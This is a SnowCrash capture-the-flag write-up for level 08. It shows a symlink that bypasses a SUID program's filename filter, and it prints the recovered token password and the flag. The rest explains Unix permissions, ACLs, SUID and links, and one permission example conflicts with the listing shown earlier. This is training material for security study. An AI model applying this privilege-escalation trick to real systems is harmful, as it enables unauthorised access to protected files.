# LEVEL 08

## Summary

This level demonstrates a path traversal vulnerability in a SUID binary. The program filters filenames containing "token" but doesn't resolve symbolic links before the check, allowing bypass through symlinks to access the restricted token file.

## Workflow

1. The directory `/home/user/level08` contains a SUID binary and a restricted token file.
    ```
    level08@SnowCrash:~$ ls -l
    total 16
    -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08 flag08    26 Mar  5  2016 token
    ```

2. The program filters filenames containing "token" to prevent direct access.
    ```
    level08@SnowCrash:~$ ./level08 token
    You may not access 'token'
    ```

3. Create a symbolic link to bypass the filename filter.
    ```
    level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/bypass
    level08@SnowCrash:~$ ./level08 /tmp/bypass
    quif5eloekouj29ke0vouxean
    ```

4. Connect to the flag08 account using the retrieved token, then run getflag.
    ```➜  level08 git:(aautin) ssh flag08@<vm_ip_address> -p 4242
        _____                      _____               _     
        / ____|                    / ____|             | |    
        | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
        \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
        ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
        |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                            
    Good luck & Have fun

            <vm_ip_address> 
    flag08@<vm_ip_address>'s password: 
    Don't forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
    ```

## Security Model Deep Dive

### Unix File Permissions - The Three Categories

Unix file permissions operate on three distinct categories of users:

#### 1. **Owner (User)** - The file owner
- The user account that owns the file
- Gets the first set of permissions (rwx)
- Can always change file permissions with `chmod`

#### 2. **Group** - The owning group  
- Users belonging to the file's group
- Gets the second set of permissions (rwx)
- Allows sharing files among team members

#### 3. **Others (World)** - Everyone else
- All other users on the system
- Gets the third set of permissions (rwx)
- Represents the "public" access level

#### Permission Format:
```bash
-rw-r--r-- 1 flag08 level08 26 token
 │││ │││ │││
 │││ │││ └── Others: read (r), no write (-), no execute (-)
 │││ └────── Group: read (r), no write (-), no execute (-)  
 └────────── Owner: read (r), write (w), no execute (-)
```

#### ACLs (Access Control Lists)

Extended permissions beyond the basic rwx model, providing fine-grained access control:

```bash
level08@SnowCrash:~$ getfacl level08
# file: level08
# owner: flag08
# group: level08
# flags: ss-
user::rwx                    # Owner permissions
group::---                   # Default group permissions  
group:level08:r-x           # Specific group 'level08' can read/execute
group:flag08:r-x            # Specific group 'flag08' can read/execute
mask::r-x                   # Maximum allowed permissions for groups/users
other::---                  # Others have no permissions
```

**Key ACL Components:**
- **user::** - Owner permissions (same as traditional rwx)
- **group::** - Default group permissions
- **group:name:perms** - Specific group permissions
- **user:name:perms** - Specific user permissions
- **mask::** - Maximum permissions allowed (acts as a filter)
- **other::** - Everyone else permissions

**Why ACLs matter in level08:**
- The `+` in `-rwsr-s---+` indicates extended ACLs are present
- Group `level08` gets `r-x` permissions via ACL, allowing execution
- This is how you (user `level08`) can execute the SUID binary

### Root - The Superuser Exception

**Root (UID 0) transcends normal permission boundaries:**

- **Read**: Root can read ANY file, regardless of permissions (`---` or `000`)
- **Write**: Root can write to ANY file, even read-only files (`r--r--r--`)
- **Execute**: Root can execute files if ANY execute bit is set (owner, group, or others)
- **Only limitation**: If ALL execute bits are off (`rw-rw-rw-`), even root cannot execute

**Examples:**
```bash
-rw------- 1 user user 100 secret.txt    # Root can read/write this
-r--r--r-- 1 user user 50  readonly.txt  # Root can write to this  
---------- 1 user user 25  locked.txt    # Root can read/write this
-rw-rw-rw- 1 user user 75  script.sh     # Root CANNOT execute this
-rwxrwxrwx 1 user user 80  program       # Root CAN execute this
```

### SUID/SGID - Privilege Escalation

When a SUID program runs:
```
You (level08) → run ./level08 → SUID elevates to flag08 → inherits flag08's permissions
```

This is why the `level08` program can read the `token` file:
- Program runs with `flag08`'s effective UID due to SUID bit
- `token` file is owned by `flag08` with `rw-------` permissions
- Therefore, the program has read access to `token`

## Symlinks, hard/physical links, inodes and filesystem

### Understanding Inodes

An **inode** is a data structure that stores file metadata:
- File permissions, ownership, timestamps
- File size and type
- Pointers to data blocks on disk
- **NOT the filename** - filenames are stored in directories

```bash
level08@SnowCrash:~$ ls -li
123456 -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
789012 -rw-------  1 flag08 flag08    26 Mar  5  2016 token
   ↑ inode number
```

### Hard Links (Physical Links)

**Definition**: Multiple filenames pointing to the same inode

**Characteristics:**
- Same inode number = same file data
- Cannot cross filesystem boundaries
- Deleting one name doesn't delete the file (until all links are removed)
- Changes to one affect all (they're the same file)

**Creation and limitations:**
```bash
df -h
Filesystem      Size  Used Avail Use% Mounted on
/cow           1007M   13M  994M   2% /              # Root filesystem
tmpfs          1007M     0 1007M   0% /tmp           # Separate tmpfs filesystem

# This works (same filesystem):
ln /home/user/level08/token /home/user/level08/hardlink

# This fails (different filesystems):
ln /home/user/level08/token /tmp/hardlink
# Error: Invalid cross-device link
```

**Why cross-device fails:**
- Inode numbers are only unique within a filesystem
- `/home` (on `/cow`) and `/tmp` (on `tmpfs`) are different filesystems
- Cannot reference an inode from a different filesystem

### Symbolic Links (Soft Links)

**Definition**: Special files containing paths to other files

**Characteristics:**
- Different inode from target file
- Can cross any filesystem boundaries
- Can point to non-existent files
- Can create circular references
- Essentially shortcuts or aliases

**Creation:**
```bash
ln -s /home/user/level08/token /tmp/symlink    # Works across filesystems ✓
```

### Filesystem Boundaries in SnowCrash

```bash
level08@SnowCrash:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/cow           1007M   13M  994M   2% /              # Root filesystem
tmpfs          1007M     0 1007M   0% /tmp           # Separate tmpfs filesystem
```

**Key insights:**
- `/home/user/level08/` is on root filesystem (`/cow`)
- `/tmp/` is on separate tmpfs filesystem
- Hard links fail between `/home` and `/tmp`
- Symbolic links work between any directories
